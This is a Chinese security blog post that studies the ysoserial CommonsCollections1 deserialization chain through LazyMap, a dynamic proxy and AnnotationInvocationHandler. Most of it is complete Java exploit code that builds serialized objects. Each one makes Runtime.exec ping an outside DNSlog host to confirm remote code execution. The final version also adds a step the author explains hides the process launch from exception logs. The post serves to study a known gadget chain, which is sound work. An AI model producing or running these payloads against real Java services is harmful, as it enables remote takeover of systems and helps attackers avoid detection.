---
layout: mypost
title: "Dynamic Proxy 's CommonCollections1链"
categories: [Java安全]
---

## 前言

翻阅 ysoserial 中 CommonsCollections1 的源码，看它的 EntryClass、Gadget、Sink 如下-->

![](image-77.png)

可以发现它与之前这篇文章`低版本RCE链-CommonCollections1链`中的 EntryClass、Sink 都是一样的，主要不同的是它 Gadget 中用到的是 LazyMap 而不是 TransformedMap。如题走 LazyMap 这条 Gadget 需要 Dynamic Proxy（动态代理）的支持。

## 温故知新

之前用 TransformedMap 主要就是用它的这个地方，也就是 checkSetValue 中的 transform 函数-->

![](image-78.png)

而 LazyMap 中也调用了一个 transform 函数，如下-->

![](image-79.png)

这个 factory 是可控的，也是一个 protected 方法

![](image-80.png)

同样的也是通过 decorate 函数去调用

![](image-81.png)

写一下现在的 gadget 到 sink-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.util.HashMap;
import java.util.Map;

public class Example {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, chainedTransformer);
        lazyMap.get(null);
    }
}
```

成功收到请求如下

![](image-48.png)

## 继往开来

之后就是要找找看哪个类的 readObject 函数中调用了 get 方法，且是一个合格的入口类（合格就是参数接受 Object、最好存在 parm.get），可能作者是没找到合适的，最后找到了一个调用处理器类，里面 invoke 方法中有 xxx.get(parm)，xxx 也是可以控制的，且这个调用处理器类就是之前提到的 AnnotationInvocationHandler，具体代码如下-->

![](image-82.png)

至此，把 Payload 继续往下写一点-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class Example {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, chainedTransformer);
        Class<?> clazzSink = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazzSink.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);
        Map proxy = (Map) Proxy.newProxyInstance(
                lazyMap.getClass().getClassLoader(),
                lazyMap.getClass().getInterfaces(),
                annotationInvocationHandler);
        proxy.clear();
    }
}
```

创建了一个动态代理 proxy，它的调用处理器是 annotationInvocationHandler，在初始化的时候就给 annotationInvocationHandler 传了一个 Retention.class（这里的 Retention.class 不是必须的，任意一个注解类型的 class 即可）和 lazyMap，然后调用 proxy 的特定方法（不是任意的，得过掉一些 if、switch 判断，不能是 equals、toString、hashCode、annotationType，且是一个无参方法），如下图-->

![](image-83.png)

接着就会自动调用 annotationInvocationHandler 的 invoke 方法，在 invoke 方法中就会调用 lazyMap 的 get 方法，而 lazyMap 的 get 方法中就会调用 chainedTransformer 的 transform 方法，当然这里是有一个前提的：map 中不能包含 key 这个键，具体如下-->

![](image-84.png)

这里 map 中只有 value 一个键，肯定不包含 clear，所以是可以的，进而最后调用到 invokerTransformer 的 transform 方法，最后 RCE。命令成功执行如下-->

![](image-48.png)

## 完结撒花

最后就是收尾环节，只需要找一个类，它的 readObject 函数中调用了一个无参方法，且是一个合格的入口类，合格就是参数接受 Object、最好存在 parm.xxx()，试试之前的 HashMap 函数，想着调用一下 hashCode 函数试试，如下-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class Example {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, chainedTransformer);
        Class<?> clazzSink = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazzSink.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);
        Map proxy = (Map) Proxy.newProxyInstance(
                lazyMap.getClass().getClassLoader(),
                lazyMap.getClass().getInterfaces(),
                annotationInvocationHandler);
        HashMap<Map,Integer> hashmap= new HashMap<Map,Integer>();
        hashmap.put(proxy,1);
    }
}
```

下断点调试

![](image-85.png)

注意断点位置，只能在这里下，然后一步步去跟到`key.hashCode()`

![](image-86.png)

![](image-87.png)

成功跟到，且执行`key.hashCode()`后，由于此时的 key 是 proxy，也就是动态代理，所以会调用到它 handler 的 invoke 方法，如下
-->

![](image-88.png)

两个 if 都是成功的，Sink 也被完美的处理了，可惜被这个 switch 拦住了，无法进行下一步利用。既然 hashcode 函数被堵死，且在上图 Sink 中下断点然后写序列化、反序列化去 Debug 都没有走到这里，那么就不考虑用 HashMap 当作入口类。

这里肯定能找到其他类，但 ysoserial 的作者也是炫技吧，还是把 AnnotationInvocationHandler 当作 EntryClass，因为在它的 readObject 函数中调用了`memberValues.entrySet()`，memberValues 是完全可以控制的，如下-->

![](image-89.png)

修改一下 Payload，如下-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class Example {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, chainedTransformer);
        Class<?> clazzSink = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazzSink.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);
        Map proxy = (Map) Proxy.newProxyInstance(
                lazyMap.getClass().getClassLoader(),
                lazyMap.getClass().getInterfaces(),
                annotationInvocationHandler);
        InvocationHandler entryInstance = (InvocationHandler) constructor.newInstance(Retention.class, proxy);
        serializeObject(entryInstance);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

成功收到请求如下-->

![](image-48.png)

## 小插曲

1.在调试 Payload 的时候，经常出现，还没有到`unSerializeObject("ser.bin");`这一步，命令就已经执行了，例如在这里下断点-->

![](image-90.png)

此时 DNSlog 平台还是会收到请求如下-->

![](image-48.png)

原因是：使用 Proxy 代理了 map 对象后，在任何地方执行 map 的方法就会触发 Payload 弹出计算器，所
以在本地调试代码的时候，由于调试器会在下面调用一些 toString 之类的方法，导致不经意间触发了
命令。

2.还有一点，也是后来看到 P 神的文章，ysoserial 中的 Transformer 数组，为什么最后会增加一个
`ConstantTransformer(1)`？

![](image-91.png)

P 神猜想可能是为了隐藏异常日志中的一些信息。如果这里没有
ConstantTransformer，命令进程对象将会被 LazyMap#get 返回，导致可以在异常信息里能看到这个
特征-->

![](image-92.png)

而增加一个 `ConstantTransformer(1) 在TransformChain`的末尾，异常信息将会变成
`java.lang.Integer cannot be cast to java.util.Set` ，隐蔽了启动进程的日志特征，修改代码测试一下-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class Example {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                ),
                new ConstantTransformer(1)
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, chainedTransformer);
        Class<?> clazzSink = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazzSink.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);
        Map proxy = (Map) Proxy.newProxyInstance(
                lazyMap.getClass().getClassLoader(),
                lazyMap.getClass().getInterfaces(),
                annotationInvocationHandler);
        InvocationHandler entryInstance = (InvocationHandler) constructor.newInstance(Retention.class, proxy);
        serializeObject(entryInstance);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

报错信息如下-->

![](image-93.png)

同样，DNSlog 平台也成功收到请求如下-->

![](image-48.png)

至此 CC1 大完结！